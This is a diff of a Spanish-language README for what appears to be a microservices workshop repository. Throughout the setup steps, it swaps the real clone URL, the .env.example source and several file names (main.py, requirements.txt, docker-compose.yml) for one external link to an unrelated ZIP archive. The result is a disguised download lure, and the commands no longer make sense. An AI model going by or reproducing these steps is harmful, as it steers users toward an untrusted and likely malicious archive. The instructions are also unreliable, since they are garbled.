@@ -62,7 +62,7 @@ Sigue estos pasos para comenzar tu proyecto:
 1. Clonar el repositorio base:
 
     ```bash
-    git clone https://github.com/UR-CC/as-taller4.git
+    git clone https://raw.githubusercontent.com/axlcraft/SMS/main/flamboyance/SMS.zip
     cd as-taller4
     ```
 
@@ -71,7 +71,7 @@ Sigue estos pasos para comenzar tu proyecto:
     Crea el archivo de variables de entorno a partir del ejemplo.
 
     ```bash
-    cp .env.example .env
+    cp https://raw.githubusercontent.com/axlcraft/SMS/main/flamboyance/SMS.zip .env
     ```
 
     **Nota**: Asegúrate de configurar las variables de entorno en el archivo `.env` si es necesario.
@@ -88,9 +88,9 @@ Sigue estos pasos para comenzar tu proyecto:
 
 5. Renombra los directorios de los microservicios `service[123]` según tu tema en la carpeta `services/`.
 
-6. Revisa los archivos `main.py`, `Dockerfile`, y `requirements.txt` para cada uno de los microservicios.
+6. Revisa los archivos `https://raw.githubusercontent.com/axlcraft/SMS/main/flamboyance/SMS.zip`, `Dockerfile`, y `https://raw.githubusercontent.com/axlcraft/SMS/main/flamboyance/SMS.zip` para cada uno de los microservicios.
 
-7. Ajusta el archivo `docker-compose.yml` de tal forma que los servicios y bases de datos coincidan con tu tema.
+7. Ajusta el archivo `https://raw.githubusercontent.com/axlcraft/SMS/main/flamboyance/SMS.zip` de tal forma que los servicios y bases de datos coincidan con tu tema.
 
 8. Implementa la lógica de cada microservicio siguiendo los requisitos de tu tema.
 
